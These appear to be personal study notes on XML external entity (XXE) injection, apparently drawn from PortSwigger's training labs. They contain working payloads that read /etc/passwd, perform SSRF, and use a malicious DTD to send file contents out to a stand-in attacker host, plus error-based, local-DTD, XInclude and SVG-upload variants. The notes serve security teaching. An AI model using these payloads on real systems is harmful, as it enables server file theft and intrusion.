## Definition
XML external entity injection:
allows an attacker to interfere with an application's processing of XML data
It often allows an attacker to:
- view files on the application server filesystem
- interact with any back-end or external systems that the app itself can access

## How do XXE vulnerabilities arise
Some applications use the XML format to:
transmit data between the browser and the server. 
Apps that do this: 
- virtually always use a standard library or platform API 
- to process the XML data on the server
=>
XXE vulnerabilities arise because: the XML specification contains:
- various potentially dangerous features
- and standard parsers support these features 
	- even if they are not normally used by the application

## XXE attack types
There are various types of XXE attacks:
- [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files):
	- external entity is defined containing the contents of a file
	- and returned in the application's response.
- [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks):
	- external entity is defined based on a URL to a back-end system.
- [Exploiting blind XXE exfiltrate data out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band):
	- sensitive data is transmitted from the application server to a system 
	  (that the attacker controls)
- [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages):
	- attacker can trigger a parsing error message containing sensitive data

## Find and test for XXE vulnerabilities
- Testing for file retrieval:
	- by defining an external entity 
		- based on a well-known OS file 
		- using that entity in data that is returned in the application's response.
- Testing for blind XXE vulnerabilities:
	- by defining an external entity 
		- based on a URL to a system that you control
		- monitoring for interactions with that system. 
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document 
	- by using an XInclude attack 
		- to try to retrieve a well-known OS file
## Exploiting XXE to retrieve files
To perform an XXE injection attack that retrieves an arbitrary file from the server's FS:
you need to modify the submitted XML in two ways:
- Introduce (or edit) a `DOCTYPE` element 
	- that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response
	- to make use of the defined external entity

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
`<?xml version="1.0" encoding="UTF-8"?> 
`<stockCheck><productId>381</productId></stockCheck>`

The application performs no particular defenses against XXE attacks
=>
you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:
`<?xml version="1.0" encoding="UTF-8"?> 
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
`<stockCheck><productId>&xxe;</productId></stockCheck>`

This XXE payload:
- defines an external entity `&xxe;` 
- whose value is the contents of the `/etc/passwd` file 
- and uses the entity within the `productId` value 

This causes the application's response to include the contents of the file:
![[Pasted image 20240910141658.png]]

### Exploiting XXE using external entities to retrieve files
- Visit a product page, click "Check stock"
- intercept the resulting POST request in Burp Suite
  ![[Pasted image 20240910142350.png]]
- insert under the first line the `DOCTYPE`:
  `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
- change the `productId` value to --> `xxe;`
	- that is the reference the external entity

## Exploiting XXE to perform SSRF attacks
one other impact of XXE:
they can be used to perform server-side request forgery (SSRF)
=>
the server-side app can be induced to make HTTP req to any URL that the server can access

To exploit an XXE vulnerability to perform an SSRF attack you need to:
- define an external XML entity using the URL that you want to target
- use the defined entity within a data value

In the following XXE example:
- the external entity will cause the server to make a back-end HTTP request 
- to an internal system within the organization's infrastructure:
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

## Blind XXE
- app is vulnerable to XXE injection 
- but does not return the values of any defined external entities within its responses
=>
- You can trigger out-of-band network interactions:
	- sometimes exfiltrating sensitive data within the interaction data
- You can trigger XML parsing errors 
	  in such a way that the error messages contain sensitive data

### Detecting blind XXE using out-of-band (OAST) techniques
For example, you would define an external entity as follows:
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`
You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server:
to make a back-end HTTP request to the specified URL
=>
The attacker can monitor for -->   the resulting DNS lookup and HTTP request, 
                             and thereby detect that the XXE attack was successful

#### Blind XXE with out-of-band interaction
- Visit a product page, click "Check stock" 
- intercept the resulting POST request in Burp
- insert between the XML declaration and the `stockCheck` element:
  `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
- select the BURP-COLLABORATOR-... string > right click > Insert Collaborator Payload
- change the `productId` value to `%xxe;`
- send the packet
- check the collaborator for DNS packet

#### Blind XXE with out-of-band interaction via XML parameter entities
Sometimes XXE attacks using regular entities are blocked:
due to -->   some input validation by the app or some hardening of the XML parser that is being used. 
=>
In this situation, you might be able to use -->  XML parameter entities instead. 
XML parameter entities:
- are a special kind of XML entity 
- which can only be referenced elsewhere within the DTD
=>
For present purposes, you only need to know 2 things: 
1) the declaration of an XML parameter entity includes the percent character before the entity name:
   `<!ENTITY % myparameterentity "my parameter entity value" >`

2) parameter entities are referenced using the percent character instead of the usual ampersand:
   `%myparameterentity;`
=>
This means that you can test for blind XXE:
using out-of-band detection via XML parameter entities as follows:
`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

This XXE payload:
- declares an XML parameter entity called `xxe` 
- then uses the entity within the DTD. 
- This will cause a DNS lookup and HTTP request to the attacker's domain
- verifying that the attack was successful

### Exploiting blind XXE to exfiltrate data out-of-band
What an attacker really wants to achieve is to -->  exfiltrate sensitive data
=>
This can be achieved via a blind XXE vulnerability:
but it involves the attacker:
- hosting a malicious DTD on a system that they control
- then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
```

This DTD carries out the following steps:
- Defines an XML param entity called `file`-->  containing the contents of the `/etc/passwd`
- Defines an XML param entity called `eval` -->     containing a dynamic declaration of 
                                         another XML parameter entity called `exfiltrate`. 
- The `exfiltrate` entity:
	- will be evaluated by making an HTTP req to the attacker's web server 
	- containing the value of the `file` entity within the URL query string.
- Uses the `eval` entity:
	- which causes the dynamic declaration of the `exfiltrate` entity to be performed.
- Uses the `exfiltrate` entity:
	- so that its value is evaluated by requesting the specified URL
	
The attacker must then:
- host the malicious DTD on a system that they control
  (by loading it onto their own webserver)

For example, the attacker might serve the malicious DTD at the following URL:
`http://web-attacker.com/malicious.dtd`

Finally, the attacker must submit the following XXE payload to the vulnerable application:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>`

This XXE payload:
- declares an XML parameter entity called `xxe` 
- then uses the entity within the DTD
- This will cause the XML parser to fetch the external DTD from the attacker's server 
- and interpret it inline
- The steps defined within the malicious DTD:
	- are then executed
	- the `/etc/passwd` file is transmitted to the attacker's server


- Using Burp Suite Professional, go to the Collaborator tab.
- Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
- Place the Burp Collaborator payload into a malicious DTD file:
  `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`
- Click "Go to exploit server" and save the malicious DTD file on your server as .dtd
- Click "View exploit" and take a note of the URL.
- You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. 
- Visit a product page, click "Check stock", and intercept the resulting POST request
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
  `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
- Go back to the Collaborator tab, and click "Poll now". 
  If you don't see any interactions listed, wait a few seconds and try again.
- You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
- the HTTP interaction could contain the contents of the `/etc/hostname` file

### Exploiting blind XXE to retrieve data via error messages
An alternative approach to exploiting blind XXE is to:
- trigger an XML parsing error 
- where the error message contains the sensitive data that you wish to retrieve

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval; 
%error;
```
This DTD carries out the following steps:
- Defines an XML param entity called `file` -->   containing the contents of the `/etc/passwd`
- Defines an XML param entity called `eval` -->     containing a dynamic declaration of 
                                         another XML parameter entity called  `error`. 
- The `error` entity -->   will be evaluated by loading a nonexistent file 
                    whose name contains the value of the `file` entity.
- Uses the `eval` entity:
	- which causes the dynamic declaration of the `error` entity to be performed.
- Uses the `error` entity:
	- so that its value is evaluated by attempting to load the nonexistent file
	- resulting in an error message containing the name of the nonexistent file
	- which is the contents of the `/etc/passwd` file
=>
- Click "Go to exploit server" and save the following malicious DTD file on your server:
  `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;`
- When imported
	- this page will read the contents of `/etc/passwd` into the `file` entity
	- then try to use that entity in a file path.

- Click "View exploit" and take a note of the URL for your malicious DTD.
- You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. 
- Visit a product page, click "Check stock", and intercept the resulting POST request
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
  `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
- You should see an error message containing the contents of the `/etc/passwd` file

### Exploiting blind XXE by repurposing a local DTD
The preceding technique:
- works fine with an external DTD
- but it won't work with an internal DTD that is fully specified within the `DOCTYPE` elem.
This is because:
- the technique involves using an XML parameter entity 
- within the definition of another parameter entity
=>
Per the XML specification this is permitted:
- in external DTDs 
- but not in internal DTDs

If a document's DTD uses a hybrid of internal and external DTD declarations:
=>
- the internal DTD can redefine entities that are declared in the external DTD

When this happens:
the restriction on using an XML parameter entity 
within the definition of another parameter entity is -->   relaxed

=>
an attacker can:
- employ the error-based XXE technique from within an internal DTD
- provided the XML parameter entity that they use is
	- redefining an entity that is declared within an external DTD

Of course, if out-of-band connections are blocked:
=> the external DTD cannot be loaded from a remote location
Instead:
it needs to be an external DTD file that -->   is local to the application server

Essentially:
- the attack involves invoking a DTD file 
- that happens to exist on the local FS 
- and repurposing it to redefine an existing entity 
- in a way that triggers a parsing error containing sensitive data

Suppose that:
- there is a DTD file on the server FS at the location `/usr/local/app/schema.dtd`
- this DTD file defines an entity called `custom_entity`
=>
An attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following:

```
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
<!ENTITY % custom_entity ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; 
]>
```
This DTD carries out the following steps:
- Defines an XML parameter entity called `local_dtd`:
	- containing the contents of the external DTD file that exists on the server FS
- Redefines the XML parameter entity called `custom_entity`:
	- which is already defined in the external DTD file. 
	- The entity is redefined as containing the [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) 
	- for triggering an error message containing the contents of the `/etc/passwd` file.
- Uses the `local_dtd` entity:
	- so that the external DTD is interpreted
	- including the redefined value of the `custom_entity` entity
	- This results in the desired error message

#### Locating an existing DTD file to repurpose
Since this XXE attack involves repurposing an existing DTD on the server FS
=>
 a key requirement is to -->  locate a suitable file
 =>
 Because the app returns any error messages thrown by the XML parser:
 you can easily -->   enumerate local DTD files 
                 just by attempting to load them from within the internal DTD
For example:
Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`
=>
You can test whether this file is present by submitting the following XXE payload:
which will cause an error if the file is missing:
```
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
%local_dtd; 
]>
```
After you have tested a list of common DTD files to locate a file that is present:
- you then need to obtain a copy of the file 
- review it to find an entity that you can redefine

Since many common systems that include DTD files are open source:
- you can normally quickly obtain a copy of files through internet search

##### Exploiting XXE to retrieve data by repurposing a local DTD
This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.
You'll need to reference an existing DTD file on the server and redefine an entity from it.

Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`

=>
- - Visit a product page, click "Check stock", and intercept the resulting POST request
- Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:![[Pasted image 20240910155542.png]]
- This will:
	- import the Yelp DTD
	- redefine the `ISOamso` entity
	- triggering an error message containing the contents of the `/etc/passwd` file

## Finding hidden attack surface
### XInclude attacks
Some applications:
- receive client-submitted data
- embed it on the server-side into an XML document
- parse the document

In this situation:
you cannot carry out a classic XXE attack --> bc you don't control the entire XML document 
=>
cannot define or modify a `DOCTYPE` element

However, you might be able to use `XInclude` instead:
`XInclude`:
- is a part of the XML specification
- allows an XML document to be built from sub-documents
  
You can place an `XInclude` attack -->  within any data value in an XML document
=>
the attack can be performed in situations where you only control a single item of data 
that is placed into a server-side XML document

To perform an `XInclude` attack:
- you need to reference the `XInclude` namespace
- provide the path to the file that you wish to include
- For example:
  `<foo xmlns:xi="http://www.w3.org/2001/XInclude">`
  `<xi:include parse="text" href="file:///etc/passwd"/></foo>`
#### Exploiting XInclude to retrieve files
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Set the value of the `productId` parameter to:
   `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

### XXE attacks via file upload
Some applications:
- allow users to upload files 
- which are then processed server-side

Some common file formats -->  use XML or contain XML subcomponents. 
Examples of XML-based formats are -->  `DOCX` and `SVG`

For example:
- an app might allow users to upload images
- process or validate these on the server after they are uploaded
  
Even if the app expects to receive a format like PNG or JPEG:
the image processing library that is being used -->  might support SVG images
Since the SVG format uses XML,:
an attacker can -->  - submit a malicious SVG image 
                  - and so reach hidden attack surface for XXE vulnerabilities

#### Exploiting XXE via image file upload
```bash
echo '`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`' > image.svg
```

- Post a comment on a blog post, and upload this image as an avatar.
- When you view your comment, you should see the contents of the `/etc/hostname` file in your image. 
- Use the "Submit solution" button to submit the value of the server hostname